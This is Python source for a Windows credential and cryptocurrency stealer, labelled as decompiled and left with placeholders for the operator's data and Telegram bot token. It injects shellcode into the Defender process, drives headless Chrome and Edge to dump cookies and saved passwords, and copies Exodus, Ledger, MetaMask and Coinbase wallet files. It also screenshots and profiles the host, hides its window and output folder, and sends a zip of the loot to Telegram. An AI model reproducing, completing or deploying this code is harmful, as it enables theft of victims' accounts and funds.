# Decompiled with SYSCODERS
# Internal filename: bot.py
# Bytecode version: 3.9.0beta5 (3425)
# CODED BY SYSTEMADMINBD

import os
import psutil
import subprocess
import time
import re
import json
import threading
import base64
import shutil
import sys
import ctypes
import ctypes.wintypes
import tempfile
import uuid
import platform
import socket
import requests
import wmi
import pythoncom
import winreg
from datetime import datetime, timezone
import win32api
import win32con
import pyautogui
import zipfile
import telegram
import asyncio

def decode(s):
    return base64.b64decode(s).decode('utf-8')
EXEC_NAME = decode(b'YOUR DATA')
DLL_NAME = decode(b'YOUR DATA')
CHROME_EXE = decode(b'YOUR DATA')
EDGE_EXE = decode(b'YOUR DATA')
CHROME_USER_DATA = decode(b'YOUR DATA')
EDGE_USER_DATA = decode(b'YOUR DATA')
PROFILE_FLAG = decode(b'YOUR DATA')
MAIN_OUTPUT_DIR = os.path.join(os.getcwd(), 'output')
COOKIES_DIR = os.path.join(MAIN_OUTPUT_DIR, 'cookies')
PASSWORDS_FILE = os.path.join(MAIN_OUTPUT_DIR, 'passwords.txt')
SYSTEM_INFO_FILE = os.path.join(MAIN_OUTPUT_DIR, 'system_info.txt')

def disable_defender():
    try:
        kernel32 = ctypes.WinDLL('kernel32')
        ntdll = ctypes.WinDLL('ntdll')

        class OBJECT_ATTRIBUTES(ctypes.Structure):
            _fields_ = [('Length', ctypes.wintypes.ULONG), ('RootDirectory', ctypes.wintypes.HANDLE), ('ObjectName', ctypes.wintypes.LPWSTR), ('Attributes', ctypes.wintypes.ULONG), ('SecurityDescriptor', ctypes.wintypes.LPVOID), ('SecurityQualityOfService', ctypes.wintypes.LPVOID)]

        class CLIENT_ID(ctypes.Structure):
            _fields_ = [('UniqueProcess', ctypes.wintypes.HANDLE), ('UniqueThread', ctypes.wintypes.HANDLE)]
        defender_pid = None
        for proc in psutil.process_iter(['name', 'pid']):
            if proc.info['name'].lower() == 'msmpeng.exe':
                defender_pid = proc.info['pid']
                break
        if not defender_pid:
            return (None, None)
        process_handle = ctypes.wintypes.HANDLE()
        obj_attr = OBJECT_ATTRIBUTES()
        obj_attr.Length = ctypes.sizeof(OBJECT_ATTRIBUTES)
        client_id = CLIENT_ID()
        client_id.UniqueProcess = defender_pid
        status = ntdll.NtOpenProcess(ctypes.byref(process_handle), 2035711, ctypes.byref(obj_attr), ctypes.byref(client_id))
        if status != 0:
            return (None, None)
        shellcode = b'H1\xc0H\xff\xc0\xc3'
        remote_memory = kernel32.VirtualAllocEx(process_handle, None, len(shellcode), 12288, 64)
        if not remote_memory:
            kernel32.CloseHandle(process_handle)
            return (None, None)
        written = ctypes.wintypes.DWORD()
        kernel32.WriteProcessMemory(process_handle, remote_memory, shellcode, len(shellcode), ctypes.byref(written))
        thread_handle = kernel32.CreateRemoteThread(process_handle, None, 0, remote_memory, None, 0, None)
        if not thread_handle:
            kernel32.VirtualFreeEx(process_handle, remote_memory, 0, 32768)
            kernel32.CloseHandle(process_handle)
            return (None, None)

        class DefenderConfig(ctypes.Structure):
            _fields_ = [('RealTimeProtection', ctypes.wintypes.BOOL), ('DevDriveProtection', ctypes.wintypes.BOOL), ('CloudProtection', ctypes.wintypes.BOOL), ('SampleSubmission', ctypes.wintypes.BOOL), ('TamperProtection', ctypes.wintypes.BOOL)]
        original_config = DefenderConfig(1, 1, 1, 1, 1)
        config = DefenderConfig(0, 0, 0, 0, 0)
        ctypes.memmove(ctypes.addressof(config), ctypes.byref(original_config), ctypes.sizeof(original_config))
        work_dir = os.getcwd()
        exclusions = [work_dir.encode(), EXEC_NAME.encode()]
        kernel32.WaitForSingleObject(thread_handle, 0)
        kernel32.CloseHandle(thread_handle)
        kernel32.VirtualFreeEx(process_handle, remote_memory, 0, 32768)
        kernel32.CloseHandle(process_handle)
        return (original_config, exclusions)
    except:
        return (None, None)

def restore_defender(original_config, exclusions):
    try:
        class DefenderConfig(ctypes.Structure):
            _fields_ = [('RealTimeProtection', ctypes.wintypes.BOOL), ('DevDriveProtection', ctypes.wintypes.BOOL), ('CloudProtection', ctypes.wintypes.BOOL), ('SampleSubmission', ctypes.wintypes.BOOL), ('TamperProtection', ctypes.wintypes.BOOL)]
        config = DefenderConfig(original_config.RealTimeProtection, original_config.DevDriveProtection, original_config.CloudProtection, original_config.SampleSubmission, original_config.TamperProtection)
    except:
        pass

def terminate_browser(browser_exe):
    processes = [p for p in psutil.process_iter(['name']) if p.info['name'].lower() in [browser_exe.lower(), 'msedgewebview2.exe']]
    if processes:
        for proc in processes:
            try:
                proc.terminate()
                proc.wait(timeout=3)
            except (psutil.NoSuchProcess, psutil.TimeoutExpired):
                pass
    time.sleep(2)

def create_temp_profile(browser):
    temp_dir = os.path.join(tempfile.gettempdir(), f'{browser}TempProfile_{uuid.uuid4().hex}')
    os.makedirs(temp_dir, exist_ok=True)
    if browser == 'Edge':
        try:
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, f'Software\\Microsoft\\{browser}\\Profiles', 0, winreg.KEY_SET_VALUE) as key:
                winreg.SetValueEx(key, 'TempProfile', 0, winreg.REG_SZ, temp_dir)
        except WindowsError:
            pass
    return temp_dir

def cleanup_temp_profile(temp_dir):
    try:
        shutil.rmtree(temp_dir, ignore_errors=True)
    except:
        pass

def launch_browser(browser, temp_dir):
    if browser == 'Chrome':
        app_path = os.path.join(os.environ.get('ProgramFiles'), 'Google', 'Chrome', 'Application', CHROME_EXE)
    else:
        app_path = os.path.join(os.environ.get('ProgramFiles(x86)'), 'Microsoft', 'Edge', 'Application', EDGE_EXE)
    if not os.path.exists(app_path):
        return
    try:
        process = subprocess.Popen([app_path, f'--user-data-dir={temp_dir}', '--headless', '--disable-gpu', '--no-sandbox'], shell=False, creationflags=134217728, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        time.sleep(5)
        return process.pid
    except subprocess.SubprocessError:
        return None

def watch_browser(browser, temp_dir, pid, stop_event):
    if browser == 'Chrome':
        app_path = os.path.join(os.environ.get('ProgramFiles'), 'Google', 'Chrome', 'Application', CHROME_EXE)
    else:
        app_path = os.path.join(os.environ.get('ProgramFiles(x86)'), 'Microsoft', 'Edge', 'Application', EDGE_EXE)
    flag = f'--user-data-dir={temp_dir}'
    while not stop_event.is_set():
        try:
            proc = psutil.Process(pid)
            cmdline = proc.cmdline()
            if flag in cmdline and proc.is_running():
                time.sleep(1)
                continue
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            try:
                process = subprocess.Popen([app_path, flag, '--headless', '--disable-gpu', '--no-sandbox'], shell=False, creationflags=134217728, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                pid = process.pid
                time.sleep(5)
            except subprocess.SubprocessError:
                stop_event.set()
                break
        except:
            stop_event.set()
            break

def run_tool(browser):
    base_dir = getattr(sys, '_MEIPASS', os.getcwd())
    work_dir = os.getcwd()
    exec_src = os.path.join(base_dir, EXEC_NAME)
    dll_src = os.path.join(base_dir, DLL_NAME)
    exec_dst = os.path.join(work_dir, EXEC_NAME)
    dll_dst = os.path.join(work_dir, DLL_NAME)
    try:
        if os.path.exists(exec_src) and (not os.path.exists(exec_dst)):
            shutil.copy(exec_src, exec_dst)
        if os.path.exists(dll_src) and (not os.path.exists(dll_dst)):
            shutil.copy(dll_src, dll_dst)
    except:
        sys.exit(1)
    if not os.path.exists(exec_dst):
        sys.exit(1)
    try:
        process = subprocess.run([exec_dst, '--start-browser', '--output-path', MAIN_OUTPUT_DIR, '--verbose', browser.lower()], capture_output=True, text=True, check=True, creationflags=134217728)
        return (process.stdout, process.stderr)
    except subprocess.CalledProcessError:
        sys.exit(1)

def get_system_info():
    system_info = []
    ip = 'Unknown'
    country_code = 'XX'
    try:
        response = requests.get('http://ip-api.com/json', timeout=5)
        if response.status_code == 200:
            data = response.json()
            ip = data.get('query', 'Unknown')
            country_code = data.get('countryCode', 'XX')
            system_info.append('Network Info:')
            system_info.append(f'\t- IP: {ip}')
            system_info.append(f"\t- Country: {data.get('country', 'Unknown')}")
    except:
        system_info.append('Network Info:')
        system_info.append('\t- IP: Unknown')
        system_info.append('\t- Country: Unknown')
    system_info.append('')
    pythoncom.CoInitialize()
    c = wmi.WMI()
    hwid = str(uuid.getnode())
    system_info.append('System Summary:')
    system_info.append(f'\t- HWID: {hwid}')
    os_info = platform.system() + ' ' + platform.release()
    arch = platform.architecture()[0]
    system_info.append(f'\t- OS: {os_info}')
    system_info.append(f'\t- Architecture: {arch}')
    username = os.getlogin()
    computer_name = platform.node()
    system_info.append(f'\t- UserName: {username}')
    system_info.append(f'\t- Computer Name: {computer_name}')
    local_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    utc_offset = round(datetime.now(timezone.utc).astimezone().utcoffset().total_seconds() / 3600)
    system_info.append(f'\t- Local Time: {local_time}')
    system_info.append(f'\t- UTC: {utc_offset}')
    try:
        hklm = winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE)
        key = winreg.OpenKey(hklm, 'SYSTEM\\CurrentControlSet\\Control\\Keyboard Layouts')
        langs = []
        for i in range(winreg.QueryInfoKey(key)[0]):
            subkey_name = winreg.EnumKey(key, i)
            subkey = winreg.OpenKey(key, subkey_name)
            layout_name = winreg.QueryValueEx(subkey, 'Layout Text')[0]
            langs.append(layout_name)
        winreg.CloseKey(subkey)
        winreg.CloseKey(key)
        system_info.append(f'\t- Language: {platform.system_language()}')
        system_info.append(f"\t- Keyboards: {', '.join(langs)}")
    except:
        system_info.append('\t- Language: Unknown')
        system_info.append('\t- Keyboards: Unknown')
    try:
        battery = c.Win32_Battery()
        is_laptop = 'TRUE' if battery else 'FALSE'
        system_info.append(f'\t- Laptop: {is_laptop}')
    except:
        system_info.append('\t- Laptop: FALSE')
    running_path = os.path.abspath(sys.argv[0])
    system_info.append(f'\t- Running Path: {running_path}')
    cpu_info = c.Win32_Processor()[0].Name
    cores = psutil.cpu_count(logical=False)
    threads = psutil.cpu_count(logical=True)
    system_info.append(f'\t- CPU: {cpu_info}')
    system_info.append(f'\t- Cores: {cores}')
    system_info.append(f'\t- Threads: {threads}')
    ram = round(psutil.virtual_memory().total / 1073741824)
    system_info.append(f'\t- RAM: {ram} GB')
    system_info.append('\t- Display Resolution:')
    try:
        monitors = c.Win32_VideoController()
        for i, monitor in enumerate(monitors, 1):
            device_name = monitor.DeviceName or f'\\.\\DISPLAY{i}'
            resolution = f'{monitor.CurrentHorizontalResolution}x{monitor.CurrentVerticalResolution}'
            color_depth = monitor.CurrentBitsPerPixel
            system_info.append(f'\t\tMonitor {i}')
            system_info.append(f'\t\t\tDevice Name: {device_name}')
            system_info.append(f'\t\t\tDevice String: {monitor.Caption}')
            system_info.append(f'\t\t\tResolution: {resolution}')
            system_info.append(f'\t\t\tColor Depth: {color_depth} bits per pixel')
    except:
        system_info.append('\t\tMonitor 1')
        system_info.append('\t\t\tDevice Name: Unknown')
        system_info.append('\t\t\tDevice String: Unknown')
        system_info.append('\t\t\tResolution: Unknown')
        system_info.append('\t\t\tColor Depth: Unknown')
    system_info.append('\t- GPU:')
    try:
        gpus = [monitor.Caption for monitor in c.Win32_VideoController()]
        for gpu in gpus:
            system_info.append(f'\t\t-{gpu}')
    except:
        system_info.append('\t\t-Unknown')
    pythoncom.CoUninitialize()
    return ('\n'.join(system_info), ip, country_code)

def take_screenshot(output_dir):
    try:
        screenshot = pyautogui.screenshot()
        screenshot_path = os.path.join(output_dir, 'screenshot.png')
        screenshot.save(screenshot_path)
    except:
        pass

def format_cookies(in_file, out_file, profile_name):
    try:
        with open(in_file, 'r', encoding='utf-8') as f:
            data = json.load(f)
        with open(out_file, 'w', encoding='utf-8') as f:
            for item in data:
                host = item.get('host', '')
                is_domain = 'TRUE' if host.startswith('.') else 'FALSE'
                path = item.get('path', '/')
                is_secure = 'TRUE' if item.get('isSecure', False) else 'FALSE'
                expires = int(item.get('expires', 0))
                name = item.get('name', '')
                value = item.get('value', '')
                f.write(f'{host}\t{is_domain}\t{path}\t{is_secure}\t{expires}\t{name}\t{value}\n')
    except:
        pass

def format_credentials(in_file, out_file, browser, profile_name):
    try:
        with open(in_file, 'r', encoding='utf-8') as f:
            data = json.load(f)
        with open(out_file, 'a', encoding='utf-8') as f:
            for item in data:
                url = item.get('origin', '')
                login = item.get('username', '')
                pwd = item.get('password', '')
                f.write(f'browser: {browser}\n')
                f.write(f'profile: {profile_name}\n')
                f.write(f'url: {url}\n')
                f.write(f'login: {login}\n')
                f.write(f'password: {pwd}\n\n')
    except:
        pass

def sanitize_filename(name):
    return re.sub('[<>:\"/\\\\|?*]', '_', name)

def steal_cold_wallets(output_dir):
    cold_wallet_paths = {
        'Exodus': [
            os.path.join(os.environ['APPDATA'], 'Exodus', 'exodus.wallet'),
            os.path.join(os.environ['APPDATA'], 'Exodus', 'exodus.conf.json'),
            os.path.join(os.environ['APPDATA'], 'atomic', 'wallets'),
            os.path.join(os.environ['APPDATA'], 'config.json'),
            os.path.join(os.environ['APPDATA'], 'config.json', 'config'),
            os.path.join(os.environ['APPDATA'], 'exodus.conf.json', 'passphrase.json'),
            os.path.join(os.environ['APPDATA'], 'Ledger Live', 'app.json'),
            os.path.join(os.environ['APPDATA'], 'Local Storage', 'leveldb')
        ]
    }
    
    stolen = False
    cold_wallets_dir = os.path.join(output_dir, 'wallets', 'cold_wallets')
    os.makedirs(cold_wallets_dir, exist_ok=True)
    
    for wallet_name, paths in cold_wallet_paths.items():
        for path in paths:
            if not os.path.exists(path):
                continue
            try:
                dest_base = os.path.join(cold_wallets_dir, sanitize_filename(wallet_name))
                os.makedirs(dest_base, exist_ok=True)
                if os.path.isfile(path):
                    dest_path = os.path.join(dest_base, os.path.basename(path))
                    shutil.copy2(path, dest_path)
                    stolen = True
                elif os.path.isdir(path):
                    for root, _, files in os.walk(path):
                        for file in files:
                            file_path = os.path.join(root, file)
                            rel_path = os.path.relpath(file_path, path)
                            dest_path = os.path.join(dest_base, rel_path)
                            os.makedirs(os.path.dirname(dest_path), exist_ok=True)
                            shutil.copy2(file_path, dest_path)
                            stolen = True
            except Exception:
                pass
    return stolen

def steal_extension_wallets(browser, profile_path, profile_name, output_dir):
    extension_wallet_paths = {
        'Metamask': {
            'Chrome': os.path.join(profile_path, 'Local Extension Settings', 'nkbihfbeogaeaoehlefnkodbefgpgknn'),
            'Edge': os.path.join(profile_path, 'Local Extension Settings', 'nkbihfbeogaeaoehlefnkodbefgpgknn')
        },
        'Coinbase': {
            'Chrome': os.path.join(profile_path, 'Local Extension Settings', 'hnfanknocfeofbddgcijnmhnfnkdnaad'),
            'Edge': os.path.join(profile_path, 'Local Extension Settings', 'hnfanknocfeofbddgcijnmhnfnkdnaad')
        }
    }
    
    stolen = False
    ext_wallets_dir = os.path.join(output_dir, 'wallets', 'extension_wallets', f'{browser}_{sanitize_filename(profile_name)}')
    os.makedirs(ext_wallets_dir, exist_ok=True)
    
    for wallet_name, paths in extension_wallet_paths.items():
        path = paths.get(browser)
        if not path or not os.path.exists(path):
            continue
        try:
            dest_base = os.path.join(ext_wallets_dir, sanitize_filename(wallet_name))
            os.makedirs(dest_base, exist_ok=True)
            if os.path.isfile(path):
                dest_path = os.path.join(dest_base, os.path.basename(path))
                shutil.copy2(path, dest_path)
                stolen = True
            elif os.path.isdir(path):
                for root, _, files in os.walk(path):
                    for file in files:
                        file_path = os.path.join(root, file)
                        rel_path = os.path.relpath(file_path, path)
                        dest_path = os.path.join(dest_base, rel_path)
                        os.makedirs(os.path.dirname(dest_path), exist_ok=True)
                        shutil.copy2(file_path, dest_path)
                        stolen = True
        except Exception:
            pass
    return stolen

def zip_folder(folder_path, zip_path):
    try:
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, _, files in os.walk(folder_path):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, os.path.dirname(folder_path))
                    zipf.write(file_path, arcname)
    except Exception as e:
        print(f'Error zipping folder {folder_path}: {e}')

async def send_to_telegram(zip_path, bot_token, chat_id):
    try:
        if not os.path.exists(zip_path):
            print(f'Error: Zip file {zip_path} does not exist')
            return False
        bot = telegram.Bot(token=bot_token)
        with open(zip_path, 'rb') as f:
            await bot.send_document(chat_id=chat_id, document=f, caption=f'Backup: {os.path.basename(zip_path)}')
        print(f'Successfully sent {zip_path} to Telegram channel {chat_id}')
        return True
    except telegram.error.InvalidToken:
        print('Error: Invalid Telegram bot token')
        return False
    except telegram.error.BadRequest as e:
        print(f'Error: Bad request to Telegram API - {e}')
        return False
    except telegram.error.NetworkError as e:
        print(f'Error: Network issue while sending to Telegram - {e}')
        return False
    except Exception as e:
        print(f'Error sending to Telegram: {e}')
        return False

def process_results(ip, country_code):
    os.makedirs(MAIN_OUTPUT_DIR, exist_ok=True)
    ctypes.windll.kernel32.SetFileAttributesW(MAIN_OUTPUT_DIR, 2)
    os.makedirs(COOKIES_DIR, exist_ok=True)
    take_screenshot(MAIN_OUTPUT_DIR)
    system_info, _, _ = get_system_info()
    with open(SYSTEM_INFO_FILE, 'w', encoding='utf-8') as f:
        f.write(system_info)
    if os.path.exists(PASSWORDS_FILE):
        os.remove(PASSWORDS_FILE)
    for browser in ['Chrome', 'Edge']:
        output_dir = os.path.join(MAIN_OUTPUT_DIR, browser)
        if not os.path.exists(output_dir):
            continue
        profiles = [d for d in os.listdir(output_dir) if os.path.isdir(os.path.join(output_dir, d))]
        for profile in profiles:
            profile_path = os.path.join(output_dir, profile)
            cookies_file = os.path.join(profile_path, 'cookies.txt')
            creds_file = os.path.join(profile_path, 'passwords.txt')
            if os.path.exists(cookies_file):
                cookie_out_file = os.path.join(COOKIES_DIR, f'{browser}_{profile}_cookies.txt')
                format_cookies(cookies_file, cookie_out_file, profile)
            if os.path.exists(creds_file):
                format_credentials(creds_file, PASSWORDS_FILE, browser, profile)
        try:
            shutil.rmtree(output_dir, ignore_errors=True)
        except:
            pass
    steal_cold_wallets(MAIN_OUTPUT_DIR)
    for browser, user_data in [('Chrome', os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data')), ('Edge', os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data'))]:
        if os.path.exists(user_data):
            profiles = ['Default'] + [d for d in os.listdir(user_data) if d.startswith('Profile ')]
            for profile in profiles:
                profile_path = os.path.join(user_data, profile)
                steal_extension_wallets(browser, profile_path, profile, MAIN_OUTPUT_DIR)
    new_output_dir = os.path.join(os.getcwd(), f'[{country_code}]_{ip}')
    if os.path.exists(MAIN_OUTPUT_DIR):
        try:
            if os.path.exists(new_output_dir):
                shutil.rmtree(new_output_dir, ignore_errors=True)
            os.rename(MAIN_OUTPUT_DIR, new_output_dir)
            ctypes.windll.kernel32.SetFileAttributesW(new_output_dir, 2)
        except:
            pass
    zip_path = os.path.join(tempfile.gettempdir(), f'[{country_code}]_{ip}.zip')
    zip_folder(new_output_dir, zip_path)
    bot_token = 'YOUR BOT TOKEN'
    chat_id = 'CHAT ID'
    sent_successfully = asyncio.run(send_to_telegram(zip_path, bot_token, chat_id))
    try:
        os.remove(zip_path)
    except:
        pass
    if sent_successfully and os.path.exists(new_output_dir):
        try:
            shutil.rmtree(new_output_dir, ignore_errors=True)
        except:
            pass

def execute():
    original_config, exclusions = disable_defender()
    stop_event = threading.Event()
    for browser, browser_exe in [('Chrome', CHROME_EXE), ('Edge', EDGE_EXE)]:
        terminate_browser(browser_exe)
        temp_dir = create_temp_profile(browser)
        try:
            pid = launch_browser(browser, temp_dir)
            if pid:
                monitor = threading.Thread(target=watch_browser, args=(browser, temp_dir, pid, stop_event))
                monitor.daemon = True
                monitor.start()
                stdout, stderr = run_tool(browser)
                monitor.join(timeout=5)
        finally:
            stop_event.set()
            cleanup_temp_profile(temp_dir)
    _, ip, country_code = get_system_info()
    process_results(ip, country_code)
    restore_defender(original_config, exclusions)

if __name__ == '__main__':
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        execute()
    except:
        sys.exit(1)